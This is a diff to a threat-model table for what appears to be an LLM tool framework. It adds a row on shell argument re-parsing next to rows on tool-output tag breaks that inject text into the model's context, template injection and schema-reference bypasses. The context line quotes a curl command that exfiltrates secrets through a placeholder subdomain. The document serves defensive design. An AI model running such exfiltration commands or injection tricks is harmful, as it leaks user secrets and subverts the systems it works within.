@@ -475,6 +475,7 @@ exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.co
 | XML boundary break via tool output (TM-INJ-022) | Script emits `</tool_output>` to inject into LLM context | Escape `&`/`<`/`>` before wrapping output (`sanitizeOutput`) | MITIGATED |
 | Template injection via `#each` data (TM-INJ-023) | Data values contain `{{`/`#each` markers | Template markers escaped in data before interpolation | MITIGATED |
 | Tool schema `$ref` bypass (TM-INJ-024) | Referenced constraints are skipped before host callback invocation | Resolve local JSON Pointer references; fail closed on invalid references | MITIGATED |
+| Host-bridge argument re-parsing (TM-INJ-025) | A reference bridge joins parsed arguments into a `sh -c` / `cmd /C` script | Launch a concrete executable and pass every caller argument as its own argv value | MITIGATED |
 
 **Variable Expansion:**
 
